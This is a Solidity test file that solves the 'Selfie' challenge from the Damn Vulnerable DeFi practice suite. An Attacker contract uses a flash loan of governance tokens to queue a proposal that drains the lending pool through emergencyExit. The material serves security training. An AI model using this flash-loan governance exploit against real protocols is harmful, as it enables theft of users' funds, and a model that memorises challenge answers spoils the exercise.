// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    Attacker attacker;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    // Test function to execute the attack
    function test_selfie() public checkSolvedByPlayer {
        // The attack exploits the fact that the governance system allows a flash loan
        // to temporarily hold enough governance tokens to create a malicious proposal.
        // The malicious proposal drains all funds from the pool.
        // Step 1: Deploy the attacker contract
        attacker = new Attacker(
            address(pool),        // Address of the vulnerable Selfie Pool
            address(governance),  // Address of the SimpleGovernance contract
            address(token),       // Address of the governance token (DamnValuableVotes)
            recovery              // Address to receive stolen funds
        );

        // Step 2: Initiate a flash loan of governance tokens
        pool.flashLoan(
            IERC3156FlashBorrower(address(attacker)), // Callback address for the flash loan
            address(token),                           // Governance token
            1_500_000e18,                             // Amount to borrow
            ""                                        // No additional data required
        );

        // Step 3: Advance time by 2 days to bypass the governance delay
        vm.warp(block.timestamp + 2 days);

        // Step 4: Execute the malicious proposal to drain the pool
        governance.executeAction(1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}


// Attacker contract implementing the flash loan callback
contract Attacker is IERC3156FlashBorrower {

    address poolAddress;          // Address of the Selfie Pool
    SimpleGovernance governance;  // Governance contract instance
    DamnValuableVotes voteToken;  // Governance token instance
    address recoveryAddress;      // Address to receive stolen funds

    // ERC-3156 success constant
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    // Constructor initializes contract references
    constructor(address pool, address governanceContract, address token, address recovery) {
        poolAddress = pool;
        governance = SimpleGovernance(governanceContract);
        voteToken = DamnValuableVotes(token);
        recoveryAddress = recovery;
    }

    // Flash loan callback function
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Step 1: Delegate voting power to the attacker contract
        voteToken.delegate(address(this));

        // Step 2: Queue a malicious proposal to drain the pool
        bytes memory payload = abi.encodeWithSignature(
            "emergencyExit(address)", recoveryAddress
        );
        governance.queueAction(poolAddress, 0, payload);

        // Step 3: Approve the pool to retrieve the flash-loaned tokens
        voteToken.approve(poolAddress, amount);

        // Return success constant for ERC-3156 compliance
        return CALLBACK_SUCCESS;
    }
}
